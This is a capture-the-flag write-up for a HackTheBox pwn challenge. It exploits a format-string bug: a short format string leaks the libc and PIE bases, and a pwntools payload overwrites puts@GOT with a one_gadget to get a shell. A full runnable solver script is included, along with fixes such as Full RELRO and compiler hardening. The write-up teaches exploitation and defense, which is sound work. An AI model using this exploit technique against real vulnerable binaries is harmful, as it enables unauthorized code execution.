---
title: "Spooky Time"
date: 2027-09-13 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, format-string, no-relro, got-overwrite, one-gadget, pwntools, cwe-134]
description: "An Easy Pwn challenge with two format-string bugs and No RELRO. We leak libc and PIE in a single 11-byte format string, then overwrite the GOT entry of a function called right after the bug with a one_gadget — popping a shell without ever touching the canary or saved return address."
---

## Overview

Spooky Time is an Easy **Pwn** challenge. The binary asks you to "say something scary" — twice — and each time prints your input straight back with `printf(buf)`, the textbook [uncontrolled format string](https://cwe.mitre.org/data/definitions/134.html) bug. `checksec` shows PIE + Canary + NX, but crucially **No RELRO**, so the GOT stays writable. We turn the two `printf` calls into a leak and a write: the first leaks both libc and PIE bases, the second overwrites the GOT slot of a `puts()` call that happens right after — and that trailing `puts()` jumps straight into a glibc one_gadget.

## The technique

`main()` runs the same mistake twice:

```c
char buf1[...];           // rbp-0x14c
scanf("%11s", buf1);
printf(buf1);             // format string #1 — only 11 bytes of input
char buf2[...];           // rbp-0x140
scanf("%299s", buf2);
printf(buf2);             // format string #2 — roomy
puts("Better luck next time!");   // <- the call we hijack
```

`checksec`:

```
Arch:     amd64-64-little
RELRO:    No RELRO          <- GOT is writable
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

No RELRO means a `%n` write can land in the GOT. And because the program calls `puts()` *after* the second `printf`, overwriting `puts@GOT` redirects execution on that next call — no need to smash the stack, defeat the canary, or overwrite a return address. Two `printf` sites let us split the classic *leak-then-write* into two clean shots:

| Round | Limit | Use |
|-------|-------|-----|
| 1 | 11 chars | **leak** libc + PIE in one go |
| 2 | 299 chars | **write** a one_gadget into `puts@GOT` |

## Solution

**Stage 1 — double leak in 11 bytes.** Dumping the stack (`%6$p.%7$p…`) locates the live pointers by format-arg position: `%49$p` is a libc return address (`__libc_start_call_main+offset`) and `%51$p` is the binary's own `main` (`pie_base + 0x13c0`). `%49$p.%51$p` is exactly 11 characters, so the tiny first `scanf("%11s")` leaks **both bases at once**.

**Stage 2 — overwrite `puts@GOT`.** The second buffer sits at format-arg **offset 8**. With No RELRO, `pwntools` builds the write for us, and the trailing `puts()` fires the one_gadget:

```python
payload = fmtstr_payload(8, {puts_got: libc.address + 0xebcf1}, write_size='short')
```

The full, runnable solver:

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
e    = ELF('./spooky_time', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

LIBC_RET_OFF = 0x29d90          # %49$p = libc_base + this (__libc_start_call_main+N)
MAIN_OFF     = 0x13c0           # %51$p = pie_base + main
ONE_GADGET   = 0xebcf1          # one_gadget ./glibc/libc.so.6

host, port = sys.argv[1], int(sys.argv[2])
ws = b"\x09\x0a\x0b\x0c\x0d\x20"

while True:
    io = remote(host, port)
    io.recvuntil(b"scary!")
    io.sendline(b"%49$p.%51$p")                       # stage 1: double leak
    io.recvuntil(b"better than \n")
    libc_leak, pie_leak = [int(x, 16) for x in io.recvline().strip().split(b'.')]
    libc.address = libc_leak - LIBC_RET_OFF
    pie_base     = pie_leak  - MAIN_OFF
    puts_got     = pie_base + e.got['puts']
    one          = libc.address + ONE_GADGET

    if any(b in p64(puts_got)[:6] for b in ws):        # scanf %s would truncate -> retry
        io.close(); continue
    io.recvuntil(b"time..")
    payload = fmtstr_payload(8, {puts_got: one}, write_size='short')
    if any(b in payload for b in ws):
        io.close(); continue

    io.sendline(payload)                               # stage 2: poison puts@GOT
    io.recvuntil(b"scary??")
    io.sendline(b"cat flag.txt")                       # trailing puts() -> one_gadget -> shell
    print(io.recvall(timeout=3).decode(errors='replace'))
    break
```

Running it against the instance pops a shell and prints the flag:

```
HTB{...}
```

(Flag value redacted.)

## Why it worked

**No RELRO** keeps the Global Offset Table writable, so a format-string `%n` becomes a code-redirect primitive even on a PIE + Canary binary. Because a function (`puts`) is *called after* the vulnerable `printf`, overwriting that one GOT slot hijacks control without ever touching the stack canary or the saved return address. The two separate `printf` calls map perfectly onto the leak-then-write pattern, and a single 11-byte format string is enough to defeat both ASLR (libc) and PIE at once by reading the right two stack slots.

## Fix / defense

- Never pass user data as a format string — `printf("%s", buf)`.
- Build with **Full RELRO** (`-Wl,-z,relro,-z,now`) so the GOT is read-only after startup; even with the format-string bug, `puts@GOT` can no longer be overwritten.
- `-Wformat-security` catches a non-literal format string at compile time, and `-D_FORTIFY_SOURCE=2` flags `%n` in a writable format string at runtime.

> Gotcha worth remembering: `scanf("%Ns")` stops at any whitespace byte (`\x09\x0a\x0b\x0c\x0d\x20`). If a randomized address byte lands on one, the input truncates and the write corrupts — the solver just guards for it and reconnects for a fresh ASLR layout.
